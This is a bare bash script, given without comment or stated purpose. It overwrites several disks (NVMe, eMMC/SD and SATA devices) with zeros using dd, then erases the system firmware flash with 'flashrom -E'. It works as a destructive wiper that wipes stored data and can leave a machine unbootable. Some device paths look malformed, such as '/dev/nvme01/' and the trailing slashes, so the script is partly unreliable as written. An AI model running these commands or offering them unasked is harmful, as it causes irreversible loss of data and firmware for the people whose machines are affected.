#!/bin/bash

dd if=/dev/zero of=/dev/nvme01/ bs=1G status=progress
dd if=/dev/zero of=/dev/mmcblk0/ bs=1G status=progress
dd if=/dev/zero of=/dev/mmcblk1/ bs=1G status=progress
dd if=/dev/zero of=/dev/sda/ bs=1G status=progress
dd if=/dev/zero of=/dev/sdb/ bs=1G status=progress
flashrom -E
